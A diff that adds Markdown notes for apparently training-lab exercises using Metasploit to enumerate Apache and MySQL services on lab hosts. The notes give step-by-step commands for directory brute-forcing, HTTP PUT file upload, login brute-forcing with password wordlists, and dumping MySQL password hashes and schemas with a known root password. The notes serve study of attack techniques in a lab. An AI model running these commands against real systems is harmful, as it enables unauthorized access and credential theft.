@@ -628,3 +628,229 @@ Result: Anonymous access **allowed**
 4. [nmblookup Manual](https://www.samba.org/samba/docs/current/man-html/nmblookup.1.html)
 5. [Nmap Script: smb-os-discovery](https://nmap.org/nsedoc/scripts/smb-os-discovery.html)
 6. [Metasploit Module: SMB Version Detection](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_version)
+
+
+# Apache & MySQL Enumeration Labs using Metasploit
+
+## Lab 1: Apache Enumeration
+
+### Step 1: Access the Kali Machine
+Open the lab link to access your Kali Linux machine.
+
+### Step 2: Check Target Availability
+```bash
+ping -c 5 victim-1
+```
+
+### Step 3: Start Metasploit Framework
+```bash
+msfconsole -q
+```
+
+### Step 4: Run Auxiliary Modules
+
+#### Module 1: `http_version`
+```bash
+use auxiliary/scanner/http/http_version
+set RHOSTS victim-1
+run
+```
+
+#### Module 2: `robots_txt`
+```bash
+use auxiliary/scanner/http/robots_txt
+set RHOSTS victim-1
+run
+```
+
+#### Module 3: `http_header`
+```bash
+use auxiliary/scanner/http/http_header
+set RHOSTS victim-1
+run
+
+use auxiliary/scanner/http/http_header
+set RHOSTS victim-1
+set TARGETURI /secure
+run
+```
+
+#### Module 4: `brute_dirs`
+```bash
+use auxiliary/scanner/http/brute_dirs
+set RHOSTS victim-1
+run
+```
+
+#### Module 5: `dir_scanner`
+```bash
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS victim-1
+set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+```
+
+#### Module 6: `dir_listing`
+```bash
+use auxiliary/scanner/http/dir_listing
+set RHOSTS victim-1
+set PATH /data
+run
+```
+
+#### Module 7: `files_dir`
+```bash
+use auxiliary/scanner/http/files_dir
+set RHOSTS victim-1
+set VERBOSE false
+run
+```
+
+#### Module 8: `http_put` (Upload and Delete File)
+```bash
+use auxiliary/scanner/http/http_put
+set RHOSTS victim-1
+set PATH /data
+set FILENAME test.txt
+set FILEDATA "Welcome To AttackDefense"
+run
+
+wget http://victim-1:80/data/test.txt
+cat test.txt
+
+# Delete the file
+use auxiliary/scanner/http/http_put
+set RHOSTS victim-1
+set PATH /data
+set FILENAME test.txt
+set ACTION DELETE
+run
+
+# Try downloading again (should fail with 404)
+wget http://victim-1:80/data/test.txt
+```
+
+#### Module 9: `http_login`
+```bash
+use auxiliary/scanner/http/http_login
+set RHOSTS victim-1
+set AUTH_URI /secure/
+set VERBOSE false
+run
+```
+
+#### Module 10: `apache_userdir_enum`
+```bash
+use auxiliary/scanner/http/apache_userdir_enum
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set RHOSTS victim-1
+set VERBOSE false
+run
+```
+
+### Conclusion
+Learned Apache enumeration techniques using Metasploit modules.
+
+---
+
+## Lab 2: MySQL Enumeration
+
+### Step 1: Access the Kali Machine
+Open the lab link to access your Kali Linux machine.
+
+### Step 2: Check Target Availability
+```bash
+ping -c 4 demo.ine.local
+```
+
+### Step 3: Nmap Scan
+```bash
+nmap demo.ine.local
+```
+
+### Step 4: `mysql_version`
+```bash
+msfconsole -q
+use auxiliary/scanner/mysql/mysql_version
+set RHOSTS demo.ine.local
+run
+```
+
+### Step 5: `mysql_login`
+```bash
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+```
+
+### Step 6: `mysql_enum`
+```bash
+use auxiliary/admin/mysql/mysql_enum
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS demo.ine.local
+run
+```
+
+### Step 7: `mysql_sql`
+```bash
+use auxiliary/admin/mysql/mysql_sql
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS demo.ine.local
+run
+```
+
+### Step 8: `mysql_file_enum`
+```bash
+use auxiliary/scanner/mysql/mysql_file_enum
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS demo.ine.local
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set VERBOSE true
+run
+```
+
+### Step 9: `mysql_hashdump`
+```bash
+use auxiliary/scanner/mysql/mysql_hashdump
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS demo.ine.local
+run
+```
+
+### Step 10: `mysql_schemadump`
+```bash
+use auxiliary/scanner/mysql/mysql_schemadump
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS demo.ine.local
+run
+```
+
+### Step 11: `mysql_writable_dirs`
+```bash
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD twinkle
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+```
+
+### Conclusion
+Successfully explored MySQL enumeration using relevant Metasploit modules.
+
+---
+
+## References
+
+- [Apache](https://httpd.apache.org/)
+- [Metasploit Modules](https://www.rapid7.com/db/)
+- [MySQL](https://www.mysql.com/)
+
